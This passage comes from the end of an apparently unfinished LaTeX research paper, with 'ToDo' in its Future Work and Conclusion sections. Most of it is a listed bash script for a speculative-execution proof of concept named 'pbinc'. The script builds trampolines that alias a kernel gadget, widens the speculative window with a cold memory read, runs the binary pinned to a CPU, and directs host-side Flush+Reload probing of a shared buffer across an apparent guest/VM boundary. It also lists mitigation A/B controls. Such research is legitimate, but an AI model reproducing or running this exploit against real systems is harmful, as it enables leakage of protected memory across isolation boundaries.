    __pbinc_probe_shared = strtoull(argv[1], NULL, 16);

    ////////////////////////////////////////////
    // 3. Build CALLSITE trampolines that alias the kernel gadget
    ////////////////////////////////////////////
    // This fills __alias_tbl[] with entry points to hand-crafted callsite stubs (trampoline calls)
    // Each one has a return address that collides with the kernel gadget's class
    (void)pbinc_create_trampolines(__pbinc_kernel_gadget_addr);

    ////////////////////////////////////////////
    // 4. Allocate lab-only memory to act as a cold read for delayed branch resolution
    ////////////////////////////////////////////
    // The address will be read from inside the ".do_branch" block in pbinc.asm
    // It must be slow (ideally cold L3 or fault-suppressed) to prolong speculative window
    void *slow = aligned_alloc(4096, 4096); // Aligned for page granularity
    if (!slow) { perror("alloc slow"); exit(1); }
    __slow_predicate_ptr = (uint64_t)slow; // Patch the ASM-visible symbol

    ////////////////////////////////////////////
    // 5. Jump into ASM:
    // [1] Transiently train -> [2] Syscall (IBPB) -> [3] Spin loop
    ////////////////////////////////////////////
    pbinc_entry(); // This does not return
    return 0;
}
EOF

info "Writing Makefile (user)"
cat > "${USER_DIR}/Makefile" <<'EOF'
CC=gcc
NASM=nasm
CFLAGS=-O2 -fno-pie -no-pie
LDFLAGS=-no-pie

all: pbinc_poc

pbinc_poc: pbinc.o trampoline.o driver.o
	$(CC) $(LDFLAGS) -o $@ $^

pbinc.o: pbinc.asm
	$(NASM) -f elf64 -o $@ $<

trampoline.o: trampoline.c
	$(CC) $(CFLAGS) -c -o $@ $<

driver.o: driver.c
	$(CC) $(CFLAGS) -c -o $@ $<

clean:
	rm -f *.o pbinc_poc
EOF

info "Building user binary"
( cd "${USER_DIR}" && $MAKE -j )

################################# runtime wiring

echo
ok "Runtime wiring (guest side)"
echo "  1) Provide SHARED (C-bit=0) 1 MiB probe's guest-physical base to the module."
read -rp "Enter SHARED probe GPA (hex, e.g. 0x12345000): " SHARED_GPA
sudo_or bash -c "echo ${SHARED_GPA} > /sys/kernel/pbinc/probe"

GADDR=$(cat /sys/kernel/pbinc/gaddr)
ok "Kernel gadget @ ${GADDR}"

echo
echo "  2) Run the PoC with the guest-virtual base of the same SHARED probe"
read -rp "Enter SHARED probe GVA (hex, e.g. 0x555550000000): " SHARED_GVA

ok "Launching pbinc_poc pinned to CPU ${CPU_CORE}"
sudo_or taskset -c "${CPU_CORE}" "${USER_DIR}/pbinc_poc" "${SHARED_GVA}" &

PID=$!
ok "PoC running as PID ${PID} (spins after syscall)."

cat <<'EONOTE'

Next steps (outside this script):
  - Host-side Flush+Reload over the SHARED buffer (1 MiB), watch for hits at offset (0x2A << 12).
  - Optional mechanistic evidence in the guest:
      sudo perf stat -e branch-instructions,branch-misses,machine_clears.memory_ordering -a -- sleep 5
  - A/B controls:
      - Disable entry-IBPB / change mitigation profile => signal vanishes
      - rmmod pbinc_gadget => signal vanishes
      - Rebuild with __alias_tbl empty (training NOP) => no signal
      - Different uarch (non-Zen1/2) => no signal

Cleanup:
  kill -9 <PID>   # stop PoC spin
  (cd kmod && sudo make clean && sudo rmmod pbinc_gadget)
  (cd user && make clean)
EONOTE

# EOF
\end{lstlisting}

\section{Future Work}
ToDo


\section{Conclusion}
ToDo

\bibliography{refs}
\end{document}
